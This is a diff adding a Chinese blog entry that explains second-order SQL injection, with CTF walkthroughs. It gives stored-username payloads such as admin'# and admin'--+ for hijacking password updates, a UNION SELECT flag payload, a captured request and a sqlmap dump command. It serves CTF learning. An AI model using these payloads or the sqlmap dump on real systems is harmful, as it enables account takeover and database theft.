@@ -4,6 +4,33 @@
   
   
   <entry>
+    <title>二次注入</title>
+    <link href="/2024/04/23/%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5/"/>
+    <url>/2024/04/23/%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5/</url>
+    
+    <content type="html"><![CDATA[<p>用户跟程序交互时，通过注册，修改密码等操作将数据存入数据库中，如果没有进行过滤或者只是简单的转义后就写入到数据库中，假如用户输入恶意sql语句造成sql语句的拼接和截断，就会造成越权或者sql注入。</p><p>二次注入是存储型注入，二次注入一般出现在注册和修改密码等处</p><p>例如修改密码的sql语句是</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript">$ sql = <span class="hljs-string">&quot;UPDATE users SET PASSWORD=&#x27;$ pass&#x27; where username=&#x27;$ username&#x27; and password=&#x27;$ curr_pass&#x27; &quot;</span>;<br></code></pre></td></tr></table></figure><p>我传入的username为<code>admin&#39;#</code><br>那么语句就会变成</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript">$ sql = <span class="hljs-string">&quot;UPDATE users SET PASSWORD=’$ pass’ where username=’admin‘#’ and password=’$ curr_pass’ &quot;</span>;<br></code></pre></td></tr></table></figure><p>实际上执行的是</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript">$ sql = <span class="hljs-string">&quot;UPDATE users SET PASSWORD=’$ pass’ where username=’admin‘</span><br></code></pre></td></tr></table></figure><p>那么就可以越权修改admin的密码了</p><p>例题1<br>注册账号，无过滤</p><h3 id="October-2019-Twice-SQL-Injection"><a href="#October-2019-Twice-SQL-Injection" class="headerlink" title="[October 2019]Twice SQL Injection"></a>[October 2019]Twice SQL Injection</h3><p>开局有一个注册的跳转<br>随便注册一个进去发现没有利用的地方<br>尝试构造语句<br>注册 用户名1’ union select 666 #   密码123 登录<br><img src="/mdimg/eczr/1713877125276-d15ca93a-c553-4ab0-9149-6180eb8535a3.png" alt="image.png"><br>发现回显<br>没有过滤，直接联合查询找到flag在flag表<br>最终payload  1 ‘union select flag from flag #  123</p><p>例题2<br>修改密码，无过滤</p><h3 id="NSSRound-1-Basic-sql-by-sql"><a href="#NSSRound-1-Basic-sql-by-sql" class="headerlink" title="[NSSRound#1 Basic]sql_by_sql"></a>[NSSRound#1 Basic]sql_by_sql</h3><p>随便注册一个账号登录<br>发现/update路由修改密码<br>查看源码</p><!-- update user set password='%s' where username='%s'; --><p>注册一个<code>admin&#39;--+</code>#账号<br>然后登录<code>admin&#39;--+</code><br><strong>点击修改密码</strong><br><strong>修改成功后admin的密码被修改了，这里相对于执行</strong>update user set password=’%s’ where username=’admin’–+’;<br><strong>登录admin</strong><br>抓个查询的包</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-variable constant_">POST</span> /query <span class="hljs-variable constant_">HTTP</span>/<span class="hljs-number">1.1</span><br><span class="hljs-title class_">Host</span>: node4.<span class="hljs-property">anna</span>.<span class="hljs-property">nssctf</span>.<span class="hljs-property">cn</span>:<span class="hljs-number">28167</span><br><span class="hljs-title class_">Accept</span>: *<span class="hljs-comment">/*</span><br><span class="hljs-comment">Referer: http://node4.anna.nssctf.cn:28167/home</span><br><span class="hljs-comment">Origin: http://node4.anna.nssctf.cn:28167</span><br><span class="hljs-comment">Accept-Encoding: gzip, deflate</span><br><span class="hljs-comment">Content-Type: application/x-www-form-urlencoded; charset=UTF-8</span><br><span class="hljs-comment">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="hljs-comment">Cookie: session=eyJyb2xlIjoxLCJ1c2VybmFtZSI6ImFkbWluIn0.Zie6ig.W2qNyQXizv2MXtqtjL4v-8M4oGM</span><br><span class="hljs-comment">X-Requested-With: XMLHttpRequest</span><br><span class="hljs-comment">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36</span><br><span class="hljs-comment">Content-Length: 4</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">id=1</span><br></code></pre></td></tr></table></figure><p><code>sqlmap -r 1.txt --batch --random-agent  -T flag -C flag --dump</code></p>]]></content>
+    
+    
+    <categories>
+      
+      <category>CTF</category>
+      
+      <category>笔记</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>笔记</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
     <title>DASCTF X GFCTF 2024｜四月开启第一局</title>
     <link href="/2024/04/20/DASCTF%20X%20GFCTF%202024%EF%BD%9C%E5%9B%9B%E6%9C%88%E5%BC%80%E5%90%AF%E7%AC%AC%E4%B8%80%E5%B1%80/"/>
     <url>/2024/04/20/DASCTF%20X%20GFCTF%202024%EF%BD%9C%E5%9B%9B%E6%9C%88%E5%BC%80%E5%90%AF%E7%AC%AC%E4%B8%80%E5%B1%80/</url>
